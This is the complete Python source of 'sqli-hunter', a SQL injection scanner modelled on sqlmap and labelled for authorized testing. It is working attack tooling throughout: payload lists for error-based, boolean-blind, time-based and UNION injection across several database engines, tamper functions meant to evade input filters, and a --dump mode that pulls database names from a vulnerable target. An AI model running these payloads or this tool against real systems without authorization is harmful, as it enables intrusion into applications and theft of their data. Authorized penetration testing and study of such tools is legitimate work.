#!/usr/bin/env python3
"""
sqli-hunter — Lightweight SQL Injection Scanner
================================================
Author  : G4MEOVER18 (https://github.com/G4MEOVER18)
License : MIT
Credits : Inspired by sqlmap (https://github.com/sqlmapproject/sqlmap)
          — the gold standard for SQL injection automation.

This is a standalone, dependency-free reimplementation for educational
and authorized penetration-testing purposes ONLY.
"""

import argparse
import http.cookiejar
import json
import os
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple

# ---------------------------------------------------------------------------
# Terminal colors (ANSI — disabled on Windows without ENABLE_VIRTUAL_TERMINAL)
# ---------------------------------------------------------------------------
if sys.platform == "win32":
    import ctypes
    kernel32 = ctypes.windll.kernel32
    kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)

RESET   = "\033[0m"
BOLD    = "\033[1m"
RED     = "\033[31m"
GREEN   = "\033[32m"
YELLOW  = "\033[33m"
CYAN    = "\033[36m"
MAGENTA = "\033[35m"
WHITE   = "\033[97m"

BANNER = f"""{CYAN}{BOLD}
  ____  ____  _     _       _   _             _
 / ___||  _ \\| |   (_)     | | | |_   _ _ __ | |_ ___ _ __
 \\___ \\| | | | |   | |_____| |_| | | | | '_ \\| __/ _ \\ '__|
  ___) | |_| | |___| |_____|  _  | |_| | | | | ||  __/ |
 |____/|____/|_____|_|     |_| |_|\\__,_|_| |_|\\__\\___|_|

{RESET}{WHITE}  Lightweight SQL Injection Scanner  |  by G4MEOVER18
  Inspired by sqlmap (https://github.com/sqlmapproject/sqlmap)
{RESET}{YELLOW}  For authorized testing only — use responsibly.{RESET}
"""

VERSION = "1.0.0"

# ---------------------------------------------------------------------------
# DBMS Error Signatures — 8+ patterns per engine
# ---------------------------------------------------------------------------
DBMS_ERRORS: Dict[str, List[str]] = {
    "MySQL": [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_",
        r"MySQLSyntaxErrorException",
        r"valid MySQL result",
        r"check the manual that (corresponds to|fits) your MySQL server version",
        r"Unknown column '[^ ]+' in 'field list'",
        r"MySQL server version for the right syntax",
        r"com\.mysql\.jdbc\.exceptions",
        r"Zend_Db_(Adapter|Statement)_Mysqli_Exception",
        r"SQLSTATE\[HY000\].*MySQL",
        r"ER_PARSE_ERROR",
        r"ERROR 1064 \(42000\)",
    ],
    "MariaDB": [
        r"MariaDB server version",
        r"SQLSTATE\[HY000\].*MariaDB",
        r"com\.mariadb\.",
        r"check the manual that corresponds to your MariaDB",
        r"MariaDB.*syntax error",
        r"Incorrect syntax.*MariaDB",
        r"Unknown error.*MariaDB",
        r"mariadb\.jdbc\.",
        r"ERROR.*MariaDB",
    ],
    "MSSQL": [
        r"Driver.*SQL[\s_]*Server",
        r"OLE DB.*SQL Server",
        r"\bUnclosed quotation mark after the character string\b",
        r"Microsoft OLE DB Provider for SQL Server",
        r"Incorrect syntax near",
        r"com\.microsoft\.sqlserver\.jdbc",
        r"Unclosed quotation mark",
        r"ADODB\.Field error",
        r"ODBC SQL Server Driver",
        r"SQLServerException",
        r"System\.Data\.SqlClient\.",
        r"\[SQL Server\]",
        r"mssql_query\(\)",
    ],
    "PostgreSQL": [
        r"PostgreSQL.*ERROR",
        r"Warning.*\bpg_",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"PG::SyntaxError",
        r"org\.postgresql\.util\.PSQLException",
        r"ERROR:\s+syntax error at or near",
        r"ERROR: parser: parse error at or near",
        r"PostgreSQL query failed",
        r"ERROR:\s+unterminated quoted string",
        r"pg_exec\(\) query failed",
        r"PSQLException",
    ],
    "Oracle": [
        r"\bORA-[0-9][0-9][0-9][0-9]",
        r"Oracle error",
        r"Oracle.*Driver",
        r"Warning.*oci_",
        r"Warning.*ora_",
        r"oracle\.jdbc\.",
        r"Zend_Db_Adapter_Oracle",
        r"SQLExceptionHelper.*ORA-",
        r"OracleException",
        r"oracle\.net\.ns\.NetException",
        r"java\.sql\.SQLException.*ORA-",
        r"ORA-00907: missing right parenthesis",
    ],
    "SQLite": [
        r"SQLite/JDBCDriver",
        r"SQLite\.Exception",
        r"System\.Data\.SQLite\.SQLiteException",
        r"Warning.*sqlite_",
        r"Warning.*SQLite3::",
        r"\[SQLITE_ERROR\]",
        r"SQLite error \d",
        r"sqlite3\.OperationalError:",
        r"SQLITE_ERROR.*syntax error",
        r"near \".*\": syntax error",
        r"SQLiteException",
        r"unable to open database file",
    ],
    "DB2": [
        r"CLI Driver.*DB2",
        r"DB2 SQL error",
        r"db2_\w+\(",
        r"\bdb2\.jdbc\b",
        r"SQLCODE[=:\s]-",
        r"com\.ibm\.db2",
        r"SQLSTATE=\w{5}",
        r"DB2Exception",
        r"DB2 SQL Error: SQLCODE=",
    ],
    "Sybase": [
        r"Sybase message",
        r"Warning.*sybase",
        r"Adaptive Server Enterprise",
        r"com\.sybase\.jdbc",
        r"SybSQLException",
        r"Sybase\.Data\.AseClient",
        r"ASE Error",
        r"com\.sybase\.jconn",
        r"net\.sourceforge\.jtds",
    ],
}

# ---------------------------------------------------------------------------
# Time-based payloads per DBMS
# ---------------------------------------------------------------------------
TIME_PAYLOADS: Dict[str, List[str]] = {
    "MySQL":      ["' AND SLEEP(5)-- -", "' AND SLEEP(5)#", "1 AND SLEEP(5)"],
    "MariaDB":    ["' AND SLEEP(5)-- -", "' AND SLEEP(5)#"],
    "MSSQL":      ["'; WAITFOR DELAY '0:0:5'-- -", "1; WAITFOR DELAY '0:0:5'--"],
    "PostgreSQL": ["'; SELECT pg_sleep(5)-- -", "' AND 1=(SELECT 1 FROM pg_sleep(5))-- -"],
    "Oracle":     ["' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',5)-- -",
                   "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('x',5)-- -"],
    "SQLite":     ["' AND 1=randomblob(500000000)-- -",
                   "' AND 1=(SELECT 1 FROM (SELECT RANDOMBLOB(500000000))a)-- -"],
    "generic":    [
        "' AND SLEEP(5)-- -",
        "'; WAITFOR DELAY '0:0:5'--",
        "' AND 1=(SELECT 1 FROM pg_sleep(5))--",
        "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',5)--",
        "1 AND SLEEP(5)",
    ],
}

# ---------------------------------------------------------------------------
# Boolean-blind payloads (true / false pairs)
# ---------------------------------------------------------------------------
BOOLEAN_PAIRS: List[Tuple[str, str]] = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("' AND 1=1-- -", "' AND 1=2-- -"),
    ("' OR '1'='1", "' OR '1'='2"),
    (" AND 1=1", " AND 1=2"),
    ("1' AND '1'='1'--", "1' AND '1'='2'--"),
    ("' AND 1=1#", "' AND 1=2#"),
    ("') AND ('1'='1", "') AND ('1'='2"),
    ("1 AND 1=1", "1 AND 1=2"),
]

# ---------------------------------------------------------------------------
# UNION-based extraction skeletons (filled at runtime)
# ---------------------------------------------------------------------------
UNION_PAYLOADS: List[str] = [
    "' UNION SELECT NULL-- -",
    "' UNION SELECT NULL,NULL-- -",
    "' UNION SELECT NULL,NULL,NULL-- -",
    "' UNION SELECT NULL,NULL,NULL,NULL-- -",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -",
]

# ---------------------------------------------------------------------------
# Tamper scripts
# ---------------------------------------------------------------------------
def tamper_space2comment(payload: str) -> str:
    """Replace spaces with /**/ comment blocks."""
    return payload.replace(" ", "/**/")

def tamper_charencode(payload: str) -> str:
    """URL-encode every character in the payload."""
    return urllib.parse.quote(payload, safe="")

def tamper_randomcase(payload: str) -> str:
    """Randomly alternate case for each letter."""
    import random
    return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)

def tamper_between(payload: str) -> str:
    """Replace > / < with BETWEEN equivalents."""
    payload = re.sub(r">(\s*)(\d+)", lambda m: f"NOT BETWEEN{m.group(1)}0 AND {m.group(2)}", payload)
    payload = re.sub(r"<(\s*)(\d+)", lambda m: f"BETWEEN{m.group(1)}0 AND {m.group(2)}", payload)
    return payload

TAMPERS: Dict[str, callable] = {
    "space2comment": tamper_space2comment,
    "charencode":    tamper_charencode,
    "randomcase":    tamper_randomcase,
    "between":       tamper_between,
}

def apply_tampers(payload: str, tamper_list: List[str]) -> str:
    for name in tamper_list:
        fn = TAMPERS.get(name)
        if fn:
            payload = fn(payload)
    return payload

# ---------------------------------------------------------------------------
# Data classes
# ---------------------------------------------------------------------------
@dataclass
class InjectionPoint:
    location: str          # "GET", "POST", "COOKIE", "HEADER"
    parameter: str
    original_value: str

@dataclass
class ScanResult:
    url: str
    injection_points: List[InjectionPoint] = field(default_factory=list)
    confirmed_injections: List[dict]       = field(default_factory=list)
    dbms: Optional[str]                    = None
    databases: List[str]                   = field(default_factory=list)
    errors: List[str]                      = field(default_factory=list)

# ---------------------------------------------------------------------------
# HTTP helper
# ---------------------------------------------------------------------------
class HTTPClient:
    def __init__(self, headers: Dict[str, str], cookies: str,
                 timeout: int, proxy: Optional[str], follow_redirects: bool):
        self.headers          = headers
        self.timeout          = timeout
        self.follow_redirects = follow_redirects
        self.opener           = self._build_opener(cookies, proxy)

    def _build_opener(self, cookies: str, proxy: Optional[str]):
        handlers = []
        if proxy:
            handlers.append(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
        jar = http.cookiejar.CookieJar()
        handlers.append(urllib.request.HTTPCookieProcessor(jar))
        opener = urllib.request.build_opener(*handlers)
        if cookies:
            opener.addheaders = [("Cookie", cookies)]
        return opener

    def get(self, url: str, extra_headers: Optional[Dict[str, str]] = None) -> Tuple[int, str, float]:
        return self._request(url, None, extra_headers)

    def post(self, url: str, data: str,
             extra_headers: Optional[Dict[str, str]] = None) -> Tuple[int, str, float]:
        return self._request(url, data.encode(), extra_headers)

    def _request(self, url: str, data: Optional[bytes],
                 extra_headers: Optional[Dict[str, str]]) -> Tuple[int, str, float]:
        req = urllib.request.Request(url, data=data)
        for k, v in self.headers.items():
            req.add_header(k, v)
        if extra_headers:
            for k, v in extra_headers.items():
                req.add_header(k, v)
        t0 = time.time()
        try:
            with self.opener.open(req, timeout=self.timeout) as resp:
                body    = resp.read().decode("utf-8", errors="replace")
                elapsed = time.time() - t0
                return resp.status, body, elapsed
        except urllib.error.HTTPError as e:
            body    = e.read().decode("utf-8", errors="replace")
            elapsed = time.time() - t0
            return e.code, body, elapsed
        except urllib.error.URLError as e:
            elapsed = time.time() - t0
            raise ConnectionError(f"Request failed: {e.reason}") from e

# ---------------------------------------------------------------------------
# Detection functions
# ---------------------------------------------------------------------------

def detect_error_sqli(body: str) -> Optional[Tuple[str, str]]:
    """
    Scan response body for known DBMS error strings.
    Returns (dbms_name, matched_pattern) or None.
    """
    for dbms, patterns in DBMS_ERRORS.items():
        for pat in patterns:
            if re.search(pat, body, re.IGNORECASE):
                return dbms, pat
    return None


def detect_boolean_blind(
    client: HTTPClient,
    url: str,
    method: str,
    param: str,
    original_value: str,
    post_data: Optional[str],
    tamper_list: List[str],
    threshold: float = 0.15,
) -> Optional[dict]:
    """
    Inject boolean true/false payloads and compare response lengths.
    Returns detection dict or None.
    """
    for true_p, false_p in BOOLEAN_PAIRS:
        true_p  = apply_tampers(true_p,  tamper_list)
        false_p = apply_tampers(false_p, tamper_list)

        try:
            true_val  = urllib.parse.quote(original_value + true_p,  safe="")
            false_val = urllib.parse.quote(original_value + false_p, safe="")

            if method == "GET":
                parsed   = urllib.parse.urlparse(url)
                qs       = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                qs[param] = [original_value + true_p]
                true_url  = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                qs[param] = [original_value + false_p]
                false_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                _, true_body,  _ = client.get(true_url)
                _, false_body, _ = client.get(false_url)
            else:
                if not post_data:
                    continue
                true_data  = re.sub(rf"(?<=[?&]|^){re.escape(param)}=[^&]*",
                                    f"{param}={true_val}",  post_data)
                false_data = re.sub(rf"(?<=[?&]|^){re.escape(param)}=[^&]*",
                                    f"{param}={false_val}", post_data)
                _, true_body,  _ = client.post(url, true_data)
                _, false_body, _ = client.post(url, false_data)

            len_true  = len(true_body)
            len_false = len(false_body)
            if len_true == 0 and len_false == 0:
                continue
            ratio = abs(len_true - len_false) / max(len_true, len_false, 1)
            if ratio > threshold:
                return {
                    "technique": "boolean-blind",
                    "payload_true":  original_value + true_p,
                    "payload_false": original_value + false_p,
                    "len_true":  len_true,
                    "len_false": len_false,
                    "ratio":     round(ratio, 4),
                }
        except (ConnectionError, OSError):
            continue
    return None


def detect_time_based(
    client: HTTPClient,
    url: str,
    method: str,
    param: str,
    original_value: str,
    post_data: Optional[str],
    tamper_list: List[str],
    sleep_seconds: int = 5,
    multiplier: float  = 0.8,
    dbms_hint: Optional[str] = None,
) -> Optional[dict]:
    """
    Inject time-delay payloads and measure response time delta.
    Returns detection dict or None.
    """
    candidates = []
    if dbms_hint and dbms_hint in TIME_PAYLOADS:
        candidates.extend(TIME_PAYLOADS[dbms_hint])
    candidates.extend(TIME_PAYLOADS["generic"])

    for raw_payload in candidates:
        payload = apply_tampers(raw_payload, tamper_list)
        try:
            injected = original_value + payload

            if method == "GET":
                parsed  = urllib.parse.urlparse(url)
                qs      = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                qs[param] = [injected]
                inj_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                _, _, elapsed = client.get(inj_url)
            else:
                if not post_data:
                    continue
                enc_inj = urllib.parse.quote(injected, safe="")
                inj_data = re.sub(
                    rf"(?<=[?&]|^){re.escape(param)}=[^&]*",
                    f"{param}={enc_inj}",
                    post_data,
                )
                _, _, elapsed = client.post(url, inj_data)

            if elapsed >= sleep_seconds * multiplier:
                return {
                    "technique": "time-based-blind",
                    "payload":   injected,
                    "elapsed":   round(elapsed, 2),
                    "threshold": sleep_seconds * multiplier,
                }
        except (ConnectionError, OSError, TimeoutError):
            # Timeout itself can indicate a delay — count as positive signal
            return {
                "technique": "time-based-blind",
                "payload":   original_value + raw_payload,
                "elapsed":   float(sleep_seconds),
                "threshold": sleep_seconds * multiplier,
                "note":      "request timed out",
            }
    return None


def fingerprint_dbms(body: str, elapsed: float, sleep_seconds: int = 5) -> Optional[str]:
    """
    Attempt DBMS identification from error body + timing clues.
    """
    result = detect_error_sqli(body)
    if result:
        return result[0]

    if elapsed >= sleep_seconds * 0.8:
        # Can't be certain without knowing which payload triggered it;
        # return a generic marker.
        return "unknown (time-based)"

    return None


def extract_databases(
    client: HTTPClient,
    url: str,
    method: str,
    param: str,
    original_value: str,
    post_data: Optional[str],
    dbms: Optional[str],
    tamper_list: List[str],
) -> List[str]:
    """
    Attempt to enumerate database names via UNION/error injection.
    Returns list of found database names.
    """
    databases: List[str] = []

    # DBMS-specific DB-list payloads
    db_payloads: Dict[str, str] = {
        "MySQL":      "' UNION SELECT GROUP_CONCAT(schema_name SEPARATOR ','),NULL FROM information_schema.schemata-- -",
        "MariaDB":    "' UNION SELECT GROUP_CONCAT(schema_name SEPARATOR ','),NULL FROM information_schema.schemata-- -",
        "MSSQL":      "' UNION SELECT name,NULL FROM master..sysdatabases-- -",
        "PostgreSQL": "' UNION SELECT string_agg(datname,','),NULL FROM pg_database-- -",
        "Oracle":     "' UNION SELECT LISTAGG(OWNER,',') WITHIN GROUP (ORDER BY OWNER),NULL FROM all_tables-- -",
        "SQLite":     "' UNION SELECT group_concat(name),NULL FROM sqlite_master WHERE type='table'-- -",
    }

    payloads_to_try: List[str] = []
    if dbms and dbms in db_payloads:
        payloads_to_try.append(db_payloads[dbms])
    else:
        payloads_to_try.extend(db_payloads.values())

    for raw_payload in payloads_to_try:
        payload  = apply_tampers(raw_payload, tamper_list)
        injected = original_value + payload
        try:
            if method == "GET":
                parsed  = urllib.parse.urlparse(url)
                qs      = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                qs[param] = [injected]
                inj_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                _, body, _ = client.get(inj_url)
            else:
                if not post_data:
                    continue
                enc_inj  = urllib.parse.quote(injected, safe="")
                inj_data = re.sub(
                    rf"(?<=[?&]|^){re.escape(param)}=[^&]*",
                    f"{param}={enc_inj}",
                    post_data,
                )
                _, body, _ = client.post(url, inj_data)

            # Heuristic: look for comma-separated identifiers in response
            matches = re.findall(r"[a-zA-Z_][a-zA-Z0-9_]{2,}(?:,[a-zA-Z_][a-zA-Z0-9_]{2,})+", body)
            for m in matches:
                parts = [p.strip() for p in m.split(",") if p.strip()]
                if len(parts) >= 2:
                    databases.extend(parts)
                    break

        except (ConnectionError, OSError):
            continue

        if databases:
            break

    return list(dict.fromkeys(databases))  # deduplicate, preserve order


# ---------------------------------------------------------------------------
# Injection-point discovery
# ---------------------------------------------------------------------------

def discover_injection_points(
    url: str,
    post_data: Optional[str],
    cookies: str,
    inject_headers: bool,
) -> List[InjectionPoint]:
    """
    Parse all testable injection points from URL params, POST body,
    cookies, and (optionally) common headers.
    """
    points: List[InjectionPoint] = []

    # GET parameters
    parsed = urllib.parse.urlparse(url)
    for k, vals in urllib.parse.parse_qs(parsed.query, keep_blank_values=True).items():
        points.append(InjectionPoint("GET", k, vals[0] if vals else ""))

    # POST parameters
    if post_data:
        for k, vals in urllib.parse.parse_qs(post_data, keep_blank_values=True).items():
            points.append(InjectionPoint("POST", k, vals[0] if vals else ""))

    # Cookie values
    if cookies:
        for part in cookies.split(";"):
            part = part.strip()
            if "=" in part:
                k, _, v = part.partition("=")
                points.append(InjectionPoint("COOKIE", k.strip(), v.strip()))

    # Common injection headers
    if inject_headers:
        for hdr in ("User-Agent", "Referer", "X-Forwarded-For", "X-Real-IP"):
            points.append(InjectionPoint("HEADER", hdr, "sqli-hunter/1.0"))

    return points


# ---------------------------------------------------------------------------
# Core scan orchestrator
# ---------------------------------------------------------------------------

def scan_target(args: argparse.Namespace) -> ScanResult:
    """
    Orchestrate a full scan of the target URL according to CLI args.
    Returns a populated ScanResult.
    """
    result = ScanResult(url=args.url)

    # Build HTTP client
    base_headers: Dict[str, str] = {
        "User-Agent": args.user_agent,
        "Accept":     "*/*",
    }
    client = HTTPClient(
        headers          = base_headers,
        cookies          = args.cookies or "",
        timeout          = args.timeout,
        proxy            = getattr(args, "proxy", None),
        follow_redirects = True,
    )

    tamper_list = [t.strip() for t in args.tamper.split(",")] if args.tamper else []

    # ---- baseline request ----
    _log(f"[*] Baseline request → {args.url}", CYAN)
    try:
        _, baseline_body, baseline_time = client.get(args.url)
    except ConnectionError as exc:
        result.errors.append(str(exc))
        _log(f"[!] Baseline request failed: {exc}", RED)
        return result
    _log(f"[*] Baseline: {len(baseline_body)} bytes in {baseline_time:.2f}s", CYAN)

    # ---- discover injection points ----
    post_data     = args.data or None
    inject_hdrs   = getattr(args, "inject_headers", False)
    points        = discover_injection_points(args.url, post_data, args.cookies or "", inject_hdrs)
    result.injection_points = points

    if not points:
        _log("[!] No injectable parameters found. Provide --data or a URL with query params.", YELLOW)
        return result

    _log(f"[*] Found {len(points)} testable parameter(s).", CYAN)

    # ---- test each point ----
    for point in points:
        method = "POST" if point.location == "POST" else "GET"
        _log(f"\n[*] Testing {point.location} parameter: {BOLD}{point.parameter}{RESET}", WHITE)

        # --- Error-based ---
        _log("    [>] Error-based detection ...", YELLOW)
        err_payload = apply_tampers("'", tamper_list)
        injected    = point.original_value + err_payload

        try:
            if method == "GET":
                parsed = urllib.parse.urlparse(args.url)
                qs     = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                qs[point.parameter] = [injected]
                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                _, err_body, _ = client.get(test_url)
            else:
                enc = urllib.parse.quote(injected, safe="")
                td  = re.sub(
                    rf"(?<=[?&]|^){re.escape(point.parameter)}=[^&]*",
                    f"{point.parameter}={enc}",
                    post_data or "",
                )
                _, err_body, _ = client.post(args.url, td)

            detection = detect_error_sqli(err_body)
            if detection:
                dbms, pattern = detection
                result.dbms = dbms
                finding = {
                    "location":  point.location,
                    "parameter": point.parameter,
                    "technique": "error-based",
                    "dbms":      dbms,
                    "pattern":   pattern,
                    "payload":   injected,
                }
                result.confirmed_injections.append(finding)
                _log(f"    {GREEN}{BOLD}[+] VULNERABLE (error-based) — DBMS: {dbms}{RESET}", GREEN)
                _log(f"        Pattern: {pattern}", GREEN)
        except (ConnectionError, OSError) as exc:
            _log(f"    [!] Request error: {exc}", RED)

        # --- Boolean-blind (only if risk >= 1) ---
        if args.risk >= 1:
            _log("    [>] Boolean-blind detection ...", YELLOW)
            b_result = detect_boolean_blind(
                client, args.url, method,
                point.parameter, point.original_value,
                post_data, tamper_list,
            )
            if b_result:
                b_result.update({"location": point.location, "parameter": point.parameter})
                result.confirmed_injections.append(b_result)
                _log(f"    {GREEN}{BOLD}[+] VULNERABLE (boolean-blind){RESET} "
                     f"length ratio={b_result['ratio']}", GREEN)

        # --- Time-based (only if risk >= 2) ---
        if args.risk >= 2:
            sleep_t = 5 if args.risk == 2 else 8
            _log(f"    [>] Time-based blind detection (sleep={sleep_t}s) ...", YELLOW)
            t_result = detect_time_based(
                client, args.url, method,
                point.parameter, point.original_value,
                post_data, tamper_list,
                sleep_seconds=sleep_t,
                dbms_hint=result.dbms,
            )
            if t_result:
                t_result.update({"location": point.location, "parameter": point.parameter})
                result.confirmed_injections.append(t_result)
                _log(f"    {GREEN}{BOLD}[+] VULNERABLE (time-based-blind){RESET} "
                     f"elapsed={t_result['elapsed']}s", GREEN)

    # ---- DBMS fingerprint summary ----
    if result.dbms:
        _log(f"\n[*] DBMS fingerprinted: {MAGENTA}{BOLD}{result.dbms}{RESET}", MAGENTA)

    # ---- Data extraction (--dump) ----
    if args.dump and result.confirmed_injections:
        _log("\n[*] Attempting database enumeration (--dump) ...", CYAN)
        # Use the first confirmed injection point
        first = result.confirmed_injections[0]
        loc   = first.get("location", "GET")
        meth  = "POST" if loc == "POST" else "GET"
        param = first["parameter"]
        orig  = dict(
            (p.parameter, p.original_value)
            for p in result.injection_points
        ).get(param, "")

        dbs = extract_databases(
            client, args.url, meth, param,
            orig, post_data, result.dbms, tamper_list,
        )
        result.databases = dbs
        if dbs:
            _log(f"[+] Databases found: {GREEN}{', '.join(dbs)}{RESET}", GREEN)
        else:
            _log("[!] Could not extract databases automatically.", YELLOW)

    return result


# ---------------------------------------------------------------------------
# Output helpers
# ---------------------------------------------------------------------------

def _log(msg: str, color: str = "") -> None:
    print(f"{color}{msg}{RESET}" if color else msg)


def print_summary(result: ScanResult) -> None:
    print(f"\n{CYAN}{BOLD}{'='*60}{RESET}")
    print(f"{BOLD}SCAN SUMMARY — {result.url}{RESET}")
    print(f"{CYAN}{'='*60}{RESET}")
    print(f"  Parameters tested : {len(result.injection_points)}")
    print(f"  Vulnerabilities   : {len(result.confirmed_injections)}")
    if result.dbms:
        print(f"  DBMS              : {MAGENTA}{result.dbms}{RESET}")
    if result.databases:
        print(f"  Databases         : {', '.join(result.databases)}")
    if result.confirmed_injections:
        print(f"\n  {GREEN}{BOLD}[VULNERABLE PARAMETERS]{RESET}")
        seen = set()
        for inj in result.confirmed_injections:
            key = (inj.get("location"), inj.get("parameter"), inj.get("technique"))
            if key in seen:
                continue
            seen.add(key)
            print(f"    • {inj.get('location')} param '{inj.get('parameter')}'"
                  f"  [{inj.get('technique')}]")
    else:
        print(f"\n  {YELLOW}No confirmed injections found.{RESET}")
    if result.errors:
        print(f"\n  {RED}Errors:{RESET}")
        for e in result.errors:
            print(f"    • {e}")
    print(f"{CYAN}{'='*60}{RESET}\n")


def export_json(result: ScanResult, path: str) -> None:
    data = {
        "url":                 result.url,
        "dbms":                result.dbms,
        "databases":           result.databases,
        "injection_points":    [
            {"location": p.location, "parameter": p.parameter, "original_value": p.original_value}
            for p in result.injection_points
        ],
        "confirmed_injections": result.confirmed_injections,
        "errors":              result.errors,
    }
    with open(path, "w", encoding="utf-8") as fh:
        json.dump(data, fh, indent=2)
    _log(f"[*] Results saved to {path}", CYAN)


# ---------------------------------------------------------------------------
# CLI argument parser
# ---------------------------------------------------------------------------

def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="sqli_hunter",
        description="sqli-hunter — Lightweight SQL Injection Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python sqli_hunter.py -u "http://target.local/page.php?id=1"
  python sqli_hunter.py -u "http://target.local/login" --data "user=admin&pass=x" --risk 2
  python sqli_hunter.py -u "http://target.local/" --cookies "session=abc123" --risk 3 --dump
  python sqli_hunter.py -u "http://target.local/page.php?id=1" --tamper space2comment,randomcase
  python sqli_hunter.py -u "http://target.local/page.php?id=1" --dump --output results.json
        """,
    )
    parser.add_argument("-u", "--url",       required=True, help="Target URL")
    parser.add_argument("-d", "--data",      help="POST body (e.g. 'user=a&pass=b')")
    parser.add_argument("--cookies",         help="Cookie header string")
    parser.add_argument("--inject-headers",  action="store_true",
                        help="Also test User-Agent / Referer / X-Forwarded-For")
    parser.add_argument("--risk",            type=int, default=1, choices=[1, 2, 3],
                        help="Risk level: 1=safe, 2=medium (time-based), 3=heavy blind")
    parser.add_argument("--dump",            action="store_true",
                        help="Attempt to enumerate databases after injection confirmed")
    parser.add_argument("--tamper",          help="Comma-separated tamper scripts: "
                                                   "space2comment,charencode,randomcase,between")
    parser.add_argument("--timeout",         type=int, default=10, help="HTTP timeout (s)")
    parser.add_argument("--proxy",           help="HTTP proxy (e.g. http://127.0.0.1:8080)")
    parser.add_argument("--user-agent",      default=f"sqli-hunter/{VERSION}",
                        help="Custom User-Agent header")
    parser.add_argument("--output",          help="Write JSON results to this file")
    parser.add_argument("--version",         action="version", version=f"sqli-hunter {VERSION}")
    return parser


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main() -> None:
    print(BANNER)
    parser = build_parser()
    args   = parser.parse_args()

    # Validate tamper names
    if args.tamper:
        for t in args.tamper.split(","):
            t = t.strip()
            if t and t not in TAMPERS:
                parser.error(f"Unknown tamper script '{t}'. Available: {', '.join(TAMPERS)}")

    _log(f"[*] Target   : {args.url}", CYAN)
    _log(f"[*] Risk     : {args.risk}", CYAN)
    _log(f"[*] Timeout  : {args.timeout}s", CYAN)
    if args.tamper:
        _log(f"[*] Tampers  : {args.tamper}", CYAN)
    if args.dump:
        _log("[*] Dump mode: ON", CYAN)
    print()

    result = scan_target(args)
    print_summary(result)

    if args.output:
        export_json(result, args.output)

    # Exit code: 0 = clean, 1 = vulnerable
    sys.exit(1 if result.confirmed_injections else 0)


if __name__ == "__main__":
    main()
